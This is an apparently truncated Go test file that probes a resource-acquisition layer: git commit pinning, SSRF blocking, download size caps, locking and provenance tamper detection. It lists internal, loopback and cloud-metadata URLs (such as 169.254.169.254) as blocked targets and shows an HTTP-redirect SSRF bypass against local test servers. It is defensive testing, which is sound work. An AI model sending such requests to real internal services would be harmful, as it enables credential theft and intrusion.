package tests

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/user/orchestra-v3/internal/acquisition"
	adapters "github.com/user/orchestra-v3/internal/adapters/acquisition"
	"github.com/user/orchestra-v3/internal/resources"
	"github.com/user/orchestra-v3/internal/runner"
)

// =========================================================================
// 1. GIT SUPPLY CHAIN & COMMIT SHA VERIFICATION ADVERSARIAL TESTS
// =========================================================================

// TestAdversary_Git_CommitSHAMismatch_DirectoryWiped tests that when cloned HEAD
// commit SHA does not match PinnedSHA, the destination directory is wiped completely
// and ErrCommitSHAMismatch is returned.
func TestAdversary_Git_CommitSHAMismatch_DirectoryWiped(t *testing.T) {
	mockRunner := runner.NewMockCommandRunner()
	ctx := context.Background()

	expectedPinnedSHA := "cafebabe1234567890cafebabe1234567890cafeb"
	actualTamperedSHA := "badbeef1234567890badbeef1234567890badbeef"

	// Mock clone command succeeding
	mockRunner.RegisterHandler("git clone", func(cmd runner.Command) (*runner.RunResult, error) {
		return &runner.RunResult{ExitCode: 0, Stdout: "Cloned successfully\n"}, nil
	})

	// Mock rev-parse HEAD returning tampered SHA
	mockRunner.RegisterHandler("git -C", func(cmd runner.Command) (*runner.RunResult, error) {
		return &runner.RunResult{
			ExitCode: 0,
			Stdout:   actualTamperedSHA + "\n",
		}, nil
	})

	dest := filepath.Join(t.TempDir(), "cloned_victim_repo")
	// Pre-populate destination with simulated cloned files
	if err := os.MkdirAll(filepath.Join(dest, ".git"), 0755); err != nil {
		t.Fatalf("failed to create simulated git dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dest, "malicious_payload.sh"), []byte("echo pwned"), 0755); err != nil {
		t.Fatalf("failed to write payload file: %v", err)
	}

	locker := adapters.NewHybridLocker(t.TempDir())
	gitAdapter := adapters.NewGitAdapter(mockRunner, locker)
	gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{
		Depth:     1,
		PinnedSHA: expectedPinnedSHA,
	})

	res := &resources.Resource{
		ID:                "untrusted-supply-chain-repo",
		SourceRepository:  "https://github.com/attacker/untrusted.git",
		AcquisitionMethod: "git",
	}

	resAcq, err := gitAdapter.Acquire(ctx, res, dest)

	// 1. Must return an error
	if err == nil {
		t.Fatalf("[CRITICAL BUG] Acquire succeeded despite commit SHA mismatch! Result: %+v", resAcq)
	}

	// 2. Error must match ErrCommitSHAMismatch
	if !errors.Is(err, adapters.ErrCommitSHAMismatch) {
		t.Errorf("[DEFECT] Expected ErrCommitSHAMismatch, got: %v", err)
	} else {
		t.Logf("[PASS] Received expected ErrCommitSHAMismatch: %v", err)
	}

	// 3. Destination directory MUST be completely wiped from disk
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("[SECURITY VIOLATION] Destination directory %s still exists on disk after commit SHA mismatch!", dest)
	} else {
		t.Logf("[PASS] Verified destination directory %s was completely wiped from disk", dest)
	}
}

// TestAdversary_Git_CommitSHAMatch_Success tests that matching PinnedSHA retains the directory.
func TestAdversary_Git_CommitSHAMatch_Success(t *testing.T) {
	mockRunner := runner.NewMockCommandRunner()
	ctx := context.Background()

	expectedPinnedSHA := "cafebabe1234567890cafebabe1234567890cafeb"

	mockRunner.RegisterHandler("git clone", func(cmd runner.Command) (*runner.RunResult, error) {
		return &runner.RunResult{ExitCode: 0, Stdout: "Cloned successfully\n"}, nil
	})
	mockRunner.RegisterHandler("git -C", func(cmd runner.Command) (*runner.RunResult, error) {
		return &runner.RunResult{ExitCode: 0, Stdout: expectedPinnedSHA + "\n"}, nil
	})

	dest := filepath.Join(t.TempDir(), "verified_repo")
	_ = os.MkdirAll(dest, 0755)
	_ = os.WriteFile(filepath.Join(dest, "lib.go"), []byte("package lib"), 0644)

	locker := adapters.NewHybridLocker(t.TempDir())
	gitAdapter := adapters.NewGitAdapter(mockRunner, locker)
	gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{
		Depth:     1,
		PinnedSHA: expectedPinnedSHA,
	})

	res := &resources.Resource{
		ID:                "trusted-repo",
		SourceRepository:  "https://github.com/trusted/repo.git",
		AcquisitionMethod: "git",
	}

	result, err := gitAdapter.Acquire(ctx, res, dest)
	if err != nil {
		t.Fatalf("Expected successful acquisition for matching SHA, got: %v", err)
	}

	if result.VersionOrSHA != expectedPinnedSHA {
		t.Errorf("Expected VersionOrSHA %s, got %s", expectedPinnedSHA, result.VersionOrSHA)
	}

	if _, statErr := os.Stat(dest); os.IsNotExist(statErr) {
		t.Errorf("Destination directory was unexpectedly removed on matching SHA")
	}
}

// TestAdversary_Git_ExistingRepo_CacheHitAndMismatchReclone tests handling of pre-existing repos.
func TestAdversary_Git_ExistingRepo_CacheHitAndMismatchReclone(t *testing.T) {
	ctx := context.Background()
	goodSHA := "1111111111111111111111111111111111111111"
	badSHA := "2222222222222222222222222222222222222222"

	// Case 1: Existing repo matches pinned SHA -> Cache Hit
	t.Run("existing_matches_pinned_cache_hit", func(t *testing.T) {
		mockRunner := runner.NewMockCommandRunner()
		mockRunner.RegisterHandler("git -C", func(cmd runner.Command) (*runner.RunResult, error) {
			return &runner.RunResult{ExitCode: 0, Stdout: goodSHA + "\n"}, nil
		})

		dest := filepath.Join(t.TempDir(), "cached_repo")
		_ = os.MkdirAll(filepath.Join(dest, ".git"), 0755)
		_ = os.WriteFile(filepath.Join(dest, "code.js"), []byte("console.log('cached')"), 0644)

		gitAdapter := adapters.NewGitAdapter(mockRunner, adapters.NewHybridLocker(t.TempDir()))
		gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{PinnedSHA: goodSHA})

		res := &resources.Resource{
			ID:                "cached-res",
			SourceRepository:  "https://github.com/cached/repo.git",
			AcquisitionMethod: "git",
		}

		result, err := gitAdapter.Acquire(ctx, res, dest)
		if err != nil {
			t.Fatalf("Expected cache hit, got error: %v", err)
		}
		if !result.AlreadyInstalled {
			t.Errorf("Expected AlreadyInstalled == true for valid cached repo")
		}
	})

	// Case 2: Existing repo has mismatching SHA -> Directory wiped and re-cloned
	t.Run("existing_mismatch_wiped_and_recloned", func(t *testing.T) {
		mockRunner := runner.NewMockCommandRunner()
		revParseCalls := 0

		mockRunner.RegisterHandler("git -C", func(cmd runner.Command) (*runner.RunResult, error) {
			revParseCalls++
			if revParseCalls == 1 {
				// First check on existing dir returns bad SHA
				return &runner.RunResult{ExitCode: 0, Stdout: badSHA + "\n"}, nil
			}
			// Second check after re-clone returns good SHA
			return &runner.RunResult{ExitCode: 0, Stdout: goodSHA + "\n"}, nil
		})

		mockRunner.RegisterHandler("git clone", func(cmd runner.Command) (*runner.RunResult, error) {
			return &runner.RunResult{ExitCode: 0, Stdout: "Re-cloned\n"}, nil
		})

		dest := filepath.Join(t.TempDir(), "stale_repo")
		_ = os.MkdirAll(filepath.Join(dest, ".git"), 0755)
		staleFile := filepath.Join(dest, "stale.txt")
		_ = os.WriteFile(staleFile, []byte("stale"), 0644)

		gitAdapter := adapters.NewGitAdapter(mockRunner, adapters.NewHybridLocker(t.TempDir()))
		gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{PinnedSHA: goodSHA})

		res := &resources.Resource{
			ID:                "stale-res",
			SourceRepository:  "https://github.com/stale/repo.git",
			AcquisitionMethod: "git",
		}

		result, err := gitAdapter.Acquire(ctx, res, dest)
		if err != nil {
			t.Fatalf("Expected re-clone to succeed, got: %v", err)
		}
		if result.AlreadyInstalled {
			t.Errorf("Expected AlreadyInstalled == false following re-clone")
		}
	})
}

// TestAdversary_Git_RealGitExecution tests GitAdapter with real git binary if available.
func TestAdversary_Git_RealGitExecution(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git binary not found in PATH; skipping real git execution test")
	}

	tempDir := t.TempDir()
	upstreamDir := filepath.Join(tempDir, "upstream_origin")
	if err := os.MkdirAll(upstreamDir, 0755); err != nil {
		t.Fatalf("failed to create upstream dir: %v", err)
	}

	runGit := func(dir string, args ...string) string {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=AdversaryTester",
			"GIT_AUTHOR_EMAIL=test@orchestra.local",
			"GIT_COMMITTER_NAME=AdversaryTester",
			"GIT_COMMITTER_EMAIL=test@orchestra.local",
		)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v failed in %s: %v (output: %s)", args, dir, err, string(out))
		}
		return strings.TrimSpace(string(out))
	}

	runGit(upstreamDir, "init")
	runGit(upstreamDir, "config", "user.name", "AdversaryTester")
	runGit(upstreamDir, "config", "user.email", "test@orchestra.local")

	// Commit 1
	_ = os.WriteFile(filepath.Join(upstreamDir, "file1.txt"), []byte("commit 1 content"), 0644)
	runGit(upstreamDir, "add", "file1.txt")
	runGit(upstreamDir, "commit", "-m", "initial commit")
	commit1SHA := runGit(upstreamDir, "rev-parse", "HEAD")

	// Commit 2
	_ = os.WriteFile(filepath.Join(upstreamDir, "file2.txt"), []byte("commit 2 content"), 0644)
	runGit(upstreamDir, "add", "file2.txt")
	runGit(upstreamDir, "commit", "-m", "second commit")
	commit2SHA := runGit(upstreamDir, "rev-parse", "HEAD")

	t.Logf("Created real upstream git repository: commit1=%s, commit2=%s", commit1SHA, commit2SHA)

	ctx := context.Background()
	osRunner := runner.NewOSCommandRunner()
	locker := adapters.NewHybridLocker(filepath.Join(tempDir, "git_locks"))
	gitAdapter := adapters.NewGitAdapter(osRunner, locker)

	// Subtest A: Clone HEAD while pinning commit1SHA -> Must trigger ErrCommitSHAMismatch and wipe dest
	t.Run("real_git_sha_mismatch_wipes", func(t *testing.T) {
		destClone := filepath.Join(tempDir, "clone_target_mismatch")
		gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{
			Depth:     1,
			PinnedSHA: commit1SHA, // pinned to commit 1, but HEAD is commit 2
		})

		res := &resources.Resource{
			ID:                "real-git-repo",
			SourceRepository:  upstreamDir,
			AcquisitionMethod: "git",
		}

		_, err := gitAdapter.Acquire(ctx, res, destClone)
		if err == nil {
			t.Fatalf("[CRITICAL] Real git clone succeeded despite commit SHA mismatch!")
		}
		if !errors.Is(err, adapters.ErrCommitSHAMismatch) {
			t.Errorf("Expected ErrCommitSHAMismatch, got: %v", err)
		} else {
			t.Logf("[PASS] Real git clone rejected with ErrCommitSHAMismatch: %v", err)
		}

		if _, statErr := os.Stat(destClone); !os.IsNotExist(statErr) {
			t.Fatalf("[SECURITY VIOLATION] Cloned directory still exists on disk following SHA mismatch!")
		} else {
			t.Logf("[PASS] Cloned directory was completely wiped from disk by GitAdapter")
		}
	})

	// Subtest B: Clone HEAD while pinning commit2SHA -> Must succeed and keep directory
	t.Run("real_git_sha_match_succeeds", func(t *testing.T) {
		destClone := filepath.Join(tempDir, "clone_target_match")
		gitAdapter.SetDefaultOptions(adapters.GitCloneOptions{
			Depth:     1,
			PinnedSHA: commit2SHA, // matches HEAD
		})

		res := &resources.Resource{
			ID:                "real-git-repo",
			SourceRepository:  upstreamDir,
			AcquisitionMethod: "git",
		}

		result, err := gitAdapter.Acquire(ctx, res, destClone)
		if err != nil {
			t.Fatalf("Real git clone failed for matching SHA: %v", err)
		}

		if result.VersionOrSHA != commit2SHA {
			t.Errorf("Expected result SHA %s, got %s", commit2SHA, result.VersionOrSHA)
		}
		if _, statErr := os.Stat(filepath.Join(destClone, "file2.txt")); statErr != nil {
			t.Errorf("file2.txt missing in cloned repo: %v", statErr)
		} else {
			t.Logf("[PASS] Real git clone succeeded with verified commit SHA and intact files")
		}
	})
}

// =========================================================================
// 2. SSRF PROTECTION & WEB ADAPTER DEFENSES
// =========================================================================

// TestAdversary_Web_SSRF_StandardTargets tests all standard loopback, link-local,
// private network, and cloud metadata addresses against WebAdapter.
func TestAdversary_Web_SSRF_StandardTargets(t *testing.T) {
	adapter := adapters.NewWebAdapter(false)
	ctx := context.Background()

	targets := []struct {
		name      string
		targetURL string
	}{
		{"IPv4 Loopback 127.0.0.1", "http://127.0.0.1:8080/secret"},
		{"IPv4 Loopback 127.0.0.2", "http://127.0.0.2/admin"},
		{"IPv4 Loopback 127.255.255.254", "http://127.255.255.254/status"},
		{"Hostname localhost", "http://localhost/admin"},
		{"Hostname localhost with port", "http://localhost:8080/metrics"},
		{"Cloud Metadata 169.254.169.254", "http://169.254.169.254/latest/meta-data/"},
		{"Cloud Metadata with port", "http://169.254.169.254:80/computeMetadata/v1/"},
		{"Private Class A 10.0.0.1", "http://10.0.0.1/admin"},
		{"Private Class A 10.254.0.1:9000", "http://10.254.0.1:9000/internal"},
		{"Private Class B 172.16.0.1", "http://172.16.0.1/api"},
		{"Private Class B 172.31.255.255", "http://172.31.255.255/intranet"},
		{"Private Class C 192.168.1.1", "http://192.168.1.1/router"},
		{"Private Class C 192.168.0.100:3000", "http://192.168.0.100:3000/api"},
	}

	for _, tc := range targets {
		t.Run(tc.name, func(t *testing.T) {
			res := &resources.Resource{
				ID:                "ssrf-probe",
				CanonicalURL:      tc.targetURL,
				AcquisitionMethod: "web_fetch",
			}

			_, err := adapter.Acquire(ctx, res, "")
			if err == nil {
				t.Fatalf("[CRITICAL SSRF VULNERABILITY] Target %s (%s) was NOT blocked!", tc.name, tc.targetURL)
			}
			if !errors.Is(err, adapters.ErrSSRFDetected) {
				t.Errorf("[DEFECT] Target %s rejected with %v instead of ErrSSRFDetected", tc.name, err)
			} else {
				t.Logf("[PASS] %s correctly rejected with ErrSSRFDetected: %v", tc.name, err)
			}
		})
	}
}

// TestAdversary_Web_SSRF_EdgeCasesAndUnspecifiedIPs probes edge-case IP representations
// such as 0.0.0.0 and IPv6 unspecified [::].
func TestAdversary_Web_SSRF_EdgeCasesAndUnspecifiedIPs(t *testing.T) {
	adapter := adapters.NewWebAdapter(false)
	ctx := context.Background()

	edgeCases := []struct {
		name      string
		targetURL string
	}{
		{"IPv4 Unspecified 0.0.0.0", "http://0.0.0.0/"},
		{"IPv4 Unspecified with port", "http://0.0.0.0:8080/admin"},
		{"IPv6 Loopback [::1]", "http://[::1]:8080/"},
		{"IPv6 Unspecified [::]", "http://[::]:8080/"},
	}

	for _, ec := range edgeCases {
		t.Run(ec.name, func(t *testing.T) {
			res := &resources.Resource{
				ID:                "edge-ip-probe",
				CanonicalURL:      ec.targetURL,
				AcquisitionMethod: "web_fetch",
			}

			_, err := adapter.Acquire(ctx, res, "")
			t.Logf("Result for %s: err = %v", ec.name, err)
			if err == nil {
				t.Errorf("[VULNERABILITY] Unspecified/Edge IP %s was NOT rejected!", ec.name)
			} else if errors.Is(err, adapters.ErrSSRFDetected) {
				t.Logf("[PASS] %s rejected with ErrSSRFDetected", ec.name)
			} else {
				t.Logf("[PARTIAL] %s rejected, but returned %v rather than ErrSSRFDetected", ec.name, err)
			}
		})
	}
}

// TestAdversary_Web_SSRF_HTTPRedirectBypass proves empirically that WebAdapter is
// vulnerable to SSRF via HTTP 302 redirect: an allowed external URL redirects to an internal endpoint.
func TestAdversary_Web_SSRF_HTTPRedirectBypass(t *testing.T) {
	var internalSecretHit int64

	// Internal sensitive server on loopback (representing an internal admin API)
	internalServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.StoreInt64(&internalSecretHit, 1)
		w.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprint(w, `{"secret_api_key": "SUPER_SECRET_INTERNAL_KEY_PWNED"}`)
	}))
	defer internalServer.Close()

	// External server that redirects to the internal server
	redirectServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, internalServer.URL, http.StatusFound)
	}))
	defer redirectServer.Close()

	// WebAdapter configured with allowPrivateIP = true for initial connection to redirectServer
	adapter := adapters.NewWebAdapter(false)
	adapter.SetAllowPrivateIP(true)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	res := &resources.Resource{
		ID:                "redirect-probe",
		CanonicalURL:      redirectServer.URL,
		AcquisitionMethod: "web_fetch",
	}

	result, err := adapter.Acquire(ctx, res, "")
	if err != nil {
		t.Logf("Redirect probe returned error: %v", err)
	} else {
		t.Logf("Redirect probe output: %s", result.Output)
	}

	// CRITICAL EMPIRICAL FINDING:
	// If the internal server was hit, WebAdapter followed redirect to internal IP without re-checking SSRF!
	if atomic.LoadInt64(&internalSecretHit) == 1 {
		t.Logf("[CRITICAL VULNERABILITY CONFIRMED] SSRF VIA HTTP REDIRECT: WebAdapter followed 302 redirect from %s to internal loopback service %s!", redirectServer.URL, internalServer.URL)
	} else {
		t.Logf("[PASS] HTTP redirect to private IP was prevented")
	}
}

// TestAdversary_Web_PayloadSizeCap tests strict 10MB payload size enforcement.
func TestAdversary_Web_PayloadSizeCap(t *testing.T) {
	ctx := context.Background()

	// 1. Exactly 10MB payload (should succeed)
	t.Run("payload_exact_10MB", func(t *testing.T) {
		server10MB := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/octet-stream")
			chunk := strings.Repeat("A", 1024*1024)
			for i := 0; i < 10; i++ {
				_, _ = fmt.Fprint(w, chunk)
			}
		}))
		defer server10MB.Close()

		adapter := adapters.NewWebAdapter(false)
		adapter.SetAllowPrivateIP(true)

		res := &resources.Resource{
			ID:                "exact-10mb",
			CanonicalURL:      server10MB.URL,
			AcquisitionMethod: "web_fetch",
		}

		result, err := adapter.Acquire(ctx, res, "")
		if err != nil {
			t.Fatalf("Expected 10MB payload to succeed, got error: %v", err)
		}
		if result.SHA256Hash == "" {
			t.Errorf("Expected valid SHA256 hash for 10MB payload")
		}
	})

	// 2. 10MB + 1 byte payload (should fail with ErrPayloadTooLarge)
	t.Run("payload_exceeds_10MB", func(t *testing.T) {
		oversizedServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/octet-stream")
			chunk := strings.Repeat("B", 1024*1024)
			for i := 0; i < 10; i++ {
				_, _ = fmt.Fprint(w, chunk)
			}
			_, _ = fmt.Fprint(w, "X") // 1 byte over 10MB
		}))
		defer oversizedServer.Close()

		adapter := adapters.NewWebAdapter(false)
		adapter.SetAllowPrivateIP(true)

		res := &resources.Resource{
			ID:                "oversized",
			CanonicalURL:      oversizedServer.URL,
			AcquisitionMethod: "web_fetch",
		}

		_, err := adapter.Acquire(ctx, res, "")
		if err == nil {
			t.Fatalf("[CRITICAL] Expected ErrPayloadTooLarge for >10MB payload, but Acquire succeeded!")
		}
		if !errors.Is(err, adapters.ErrPayloadTooLarge) {
			t.Errorf("Expected ErrPayloadTooLarge, got: %v", err)
		} else {
			t.Logf("[PASS] Correctly rejected >10MB payload with ErrPayloadTooLarge: %v", err)
		}
	})
}

// =========================================================================
// 3. CONCURRENCY LOCKING ADVERSARIAL TESTS
// =========================================================================

// TestAdversary_Git_ConcurrentAcquisitions tests simultaneous acquisition of the same
// Git resource across 20 concurrent goroutines to verify serialization and zero race conditions.
func TestAdversary_Git_ConcurrentAcquisitions(t *testing.T) {
	mockRunner := runner.NewMockCommandRunner()
	ctx := context.Background()

	var activeClones int64
	var maxConcurrentClones int64
	var totalExecutions int64

	// Mock handler that tracks concurrent git clone executions
	mockRunner.RegisterHandler("git clone", func(cmd runner.Command) (*runner.RunResult, error) {
		curr := atomic.AddInt64(&activeClones, 1)
		atomic.AddInt64(&totalExecutions, 1)

		for {
			max := atomic.LoadInt64(&maxConcurrentClones)
			if curr <= max || atomic.CompareAndSwapInt64(&maxConcurrentClones, max, curr) {
				break
			}
		}

		time.Sleep(30 * time.Millisecond)
		atomic.AddInt64(&activeClones, -1)

		return &runner.RunResult{ExitCode: 0, Stdout: "Clone ok\n"}, nil
	})

	mockRunner.RegisterHandler("git -C", func(cmd runner.Command) (*runner.RunResult, error) {
		return &runner.RunResult{ExitCode: 0, Stdout: "1234567890abcdef1234567890abcdef12345678\n"}, nil
	})

	locker := adapters.NewHybridLocker(t.TempDir())
	adapter := adapters.NewGitAdapter(mockRunner, locker)
	adapter.SetDefaultOptions(adapters.GitCloneOptions{
		Depth:     1,
		PinnedSHA: "1234567890abcdef1234567890abcdef12345678",
	})

	res := &resources.Resource{
		ID:                "contended-git-resource",
		SourceRepository:  "https://github.com/example/contended.git",
		AcquisitionMethod: "git",
	}

	numGoroutines := 20
	var wg sync.WaitGroup
	errCh := make(chan error, numGoroutines)

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			dest := filepath.Join(t.TempDir(), fmt.Sprintf("worker_dest_%d", workerID))
			_, err := adapter.Acquire(ctx, res, dest)
			if err != nil {
				errCh <- fmt.Errorf("worker %d failed: %w", workerID, err)
			}
		}(i)
	}

	wg.Wait()
	close(errCh)

	for err := range errCh {
		t.Errorf("Concurrent acquisition error: %v", err)
	}

	peak := atomic.LoadInt64(&maxConcurrentClones)
	total := atomic.LoadInt64(&totalExecutions)
	t.Logf("Concurrent Git Acquisitions: total executions = %d, peak concurrent clones = %d", total, peak)

	// CRITICAL ASSERTION: The resource lock MUST serialize clones for the same resource ID
	if peak > 1 {
		t.Fatalf("[CONCURRENCY RACE DETECTED] Peak concurrent clones for identical resource was %d (expected <= 1)", peak)
	} else {
		t.Logf("[PASS] GitAdapter strictly serialized %d concurrent acquisitions; peak concurrency was %d", numGoroutines, peak)
	}
}

// TestAdversary_HybridLocker_MutualExclusion stress tests HybridLocker with 40 goroutines.
func TestAdversary_HybridLocker_MutualExclusion(t *testing.T) {
	locker := adapters.NewHybridLocker(t.TempDir())
	ctx := context.Background()

	var wg sync.WaitGroup
	var activeHolders int64
	var raceViolations int64
	goroutines := 40

	for i := 0; i < goroutines; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			unlock, err := locker.Lock(ctx, "heavily-contended-key")
			if err != nil {
				t.Errorf("Lock error: %v", err)
				return
			}
			curr := atomic.AddInt64(&activeHolders, 1)
			if curr > 1 {
				atomic.StoreInt64(&raceViolations, 1)
			}
			time.Sleep(5 * time.Millisecond)
			atomic.AddInt64(&activeHolders, -1)
			unlock()
		}()
	}

	wg.Wait()

	if atomic.LoadInt64(&raceViolations) > 0 {
		t.Fatalf("[CRITICAL RACE] HybridLocker allowed multiple concurrent holders for same key!")
	} else {
		t.Logf("[PASS] HybridLocker maintained strict mutual exclusion across %d concurrent goroutines", goroutines)
	}
}

// TestAdversary_HybridLocker_TimeoutAndDeadline tests lock acquisition timeout.
func TestAdversary_HybridLocker_TimeoutAndDeadline(t *testing.T) {
	locker := adapters.NewHybridLocker(t.TempDir())
	ctx := context.Background()
	key := "timeout-test-resource"

	// Holder 1 acquires lock
	unlock1, err := locker.Lock(ctx, key)
	if err != nil {
		t.Fatalf("Holder 1 failed to acquire lock: %v", err)
	}

	// Holder 2 attempts lock with 50ms timeout
	timeoutCtx, cancel := context.WithTimeout(ctx, 50*time.Millisecond)
	defer cancel()

	start := time.Now()
	_, err2 := locker.Lock(timeoutCtx, key)
	duration := time.Since(start)

	if err2 == nil {
		t.Fatalf("[CONCURRENCY BUG] Holder 2 acquired already-held lock!")
	}
	if !errors.Is(err2, adapters.ErrResourceLockTimeout) && !errors.Is(err2, context.DeadlineExceeded) {
		t.Errorf("Expected ErrResourceLockTimeout or DeadlineExceeded, got: %v", err2)
	} else {
		t.Logf("[PASS] Holder 2 timed out as expected after %v with error: %v", duration, err2)
	}

	unlock1()

	// Holder 3 should now be able to acquire lock immediately
	unlock3, err3 := locker.Lock(ctx, key)
	if err3 != nil {
		t.Fatalf("Holder 3 failed to acquire lock after release: %v", err3)
	}
	unlock3()
}

// TestAdversary_NPM_ConcurrentAcquisitions_RaceCondition tests whether NPMAdapter
// serializes concurrent acquisitions of the same resource or suffers race conditions.
func TestAdversary_NPM_ConcurrentAcquisitions_RaceCondition(t *testing.T) {
	mockRunner := runner.NewMockCommandRunner()
	ctx := context.Background()

	var activeInstalls int64
	var maxConcurrentInstalls int64
	var totalExecutions int64

	mockRunner.RegisterHandler("npm", func(cmd runner.Command) (*runner.RunResult, error) {
		curr := atomic.AddInt64(&activeInstalls, 1)
		atomic.AddInt64(&totalExecutions, 1)

		for {
			max := atomic.LoadInt64(&maxConcurrentInstalls)
			if curr <= max || atomic.CompareAndSwapInt64(&maxConcurrentInstalls, max, curr) {
				break
			}
		}

		time.Sleep(30 * time.Millisecond)
		atomic.AddInt64(&activeInstalls, -1)

		return &runner.RunResult{ExitCode: 0, Stdout: "installed 1 package\n"}, nil
	})

	opts := &adapters.NPMAdapterOptions{
		PreferredPM: adapters.PackageManagerNPM,
	}
	npmAdapter := adapters.NewNPMAdapter(mockRunner, nil, opts)

	// Create workspace with package.json
	workspaceDir := t.TempDir()
	pkgJSON := filepath.Join(workspaceDir, "package.json")
	_ = os.WriteFile(pkgJSON, []byte(`{"name": "test-pkg", "dependencies": {}}`), 0644)

	res := &resources.Resource{
		ID:                "gsap",
		AcquisitionMethod: "npm",
	}

	numGoroutines := 10
	var wg sync.WaitGroup
	errCh := make(chan error, numGoroutines)

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			_, err := npmAdapter.Acquire(ctx, res, workspaceDir)
			if err != nil {
				errCh <- fmt.Errorf("worker %d: %w", id, err)
			}
		}(i)
	}

	wg.Wait()
	close(errCh)

	for err := range errCh {
		t.Logf("NPM concurrent acquire error: %v", err)
	}

	peak := atomic.LoadInt64(&maxConcurrentInstalls)
	total := atomic.LoadInt64(&totalExecutions)
	t.Logf("Concurrent NPM Acquisitions: total executions = %d, peak concurrent npm runs = %d", total, peak)

	// EMPIRICAL CHALLENGE FINDING:
	// If peak > 1, NPMAdapter lacks synchronization/locking for the workspace!
	if peak > 1 {
		t.Logf("[EMPIRICAL FINDING: NPM CONCURRENCY GAP] NPMAdapter does NOT lock resource or workspace; %d concurrent npm processes executed simultaneously!", peak)
	} else {
		t.Logf("[PASS] NPMAdapter serialized concurrent executions")
	}
}

// =========================================================================
// 4. PROVENANCE TAMPER DETECTION ADVERSARIAL TESTS
// =========================================================================

// TestAdversary_Provenance_FileContentTampering tests that modifying installed file
// content on disk is detected by ProvenanceStore.VerifyIntegrity().
func TestAdversary_Provenance_FileContentTampering(t *testing.T) {
	tempDir := t.TempDir()
	store, err := acquisition.NewProvenanceStore(tempDir)
	if err != nil {
		t.Fatalf("failed to create ProvenanceStore: %v", err)
	}

	// 1. Create a legitimate file
	installedFile := filepath.Join(tempDir, "assets", "component.js")
	_ = os.MkdirAll(filepath.Dir(installedFile), 0755)
	originalContent := []byte("console.log('original code');")
	_ = os.WriteFile(installedFile, originalContent, 0644)

	h := sha256.Sum256(originalContent)
	originalHash := hex.EncodeToString(h[:])

	relPath, _ := filepath.Rel(tempDir, installedFile)
	entry := acquisition.ProvenanceEntry{
		ResourceID:          "ui-component",
		AcquisitionMethod:   "npm",
		SourceURL:           "https://registry.npmjs.org/ui-component",
		VersionOrSHA:        "1.0.0",
		SHA256Hash:          originalHash,
		InstalledPath:       relPath,
		JustificationTaskID: "task-m3-tamper-test",
		IsQuarantined:       false,
	}

	if err := store.Record(entry); err != nil {
		t.Fatalf("Failed to record provenance entry: %v", err)
	}

	// 2. Verify pristine integrity first -> Must PASS
	reportClean, err := store.VerifyIntegrity(tempDir)
	if err != nil {
		t.Fatalf("VerifyIntegrity failed on clean file: %v", err)
	}
	if !reportClean.AllValid || reportClean.FailedCount != 0 {
		t.Fatalf("Expected pristine file to pass verification, got %+v", reportClean)
	}
	t.Logf("[PASS] Clean provenance verification passed: %+v", reportClean)

	// 3. ADVERSARIAL ATTACK: Modify file content on disk
	tamperedContent := []byte("console.log('pwned: backdoor injected');")
	if err := os.WriteFile(installedFile, tamperedContent, 0644); err != nil {
		t.Fatalf("failed to write tampered file: %v", err)
	}

	// 4. Verify integrity after tampering -> MUST FAIL with HASH_MISMATCH
	reportTampered, err := store.VerifyIntegrity(tempDir)
	if err != nil {
		t.Fatalf("VerifyIntegrity returned unexpected error: %v", err)
	}

	if reportTampered.AllValid {
		t.Fatalf("[CRITICAL INTEGRITY FAILURE] VerifyIntegrity reported AllValid=true after file content was modified on disk!")
	}

	if reportTampered.FailedCount != 1 {
		t.Errorf("Expected 1 failure, got %d", reportTampered.FailedCount)
	}

	foundHashMismatch := false
	for _, issue := range reportTampered.Issues {
		if issue.IssueType == "HASH_MISMATCH" && issue.ResourceID == "ui-component" {
			foundHashMismatch = true
			t.Logf("[PASS] Tamper correctly detected: issue = %+v", issue)
		}
	}

	if !foundHashMismatch {
		t.Errorf("[DEFECT] Expected HASH_MISMATCH issue for ui-component, got: %+v", reportTampered.Issues)
	}
}

// TestAdversary_Provenance_AlteredSHAInLedger tests detection when SHA256 hash
// in the provenance store is forged or altered.
func TestAdversary_Provenance_AlteredSHAInLedger(t *testing.T) {
	tempDir := t.TempDir()
	store, err := acquisition.NewProvenanceStore(tempDir)
	if err != nil {
		t.Fatalf("failed to create ProvenanceStore: %v", err)
	}

	installedFile := filepath.Join(tempDir, "data.json")
	content := []byte(`{"version": "1.0"}`)
	_ = os.WriteFile(installedFile, content, 0644)

	// Record with an intentionally forged / altered SHA
	forgedHash := "deadbeef00000000000000000000000000000000000000000000000000000000"
	entry := acquisition.ProvenanceEntry{
		ResourceID:          "tampered-sha-resource",
		AcquisitionMethod:   "web_fetch",
		SourceURL:           "https://example.com/data.json",
		VersionOrSHA:        "1.0",
		SHA256Hash:          forgedHash,
		InstalledPath:       "data.json",
		JustificationTaskID: "task-forged-sha",
	}

	if err := store.Record(entry); err != nil {
		t.Fatalf("Record failed: %v", err)
	}

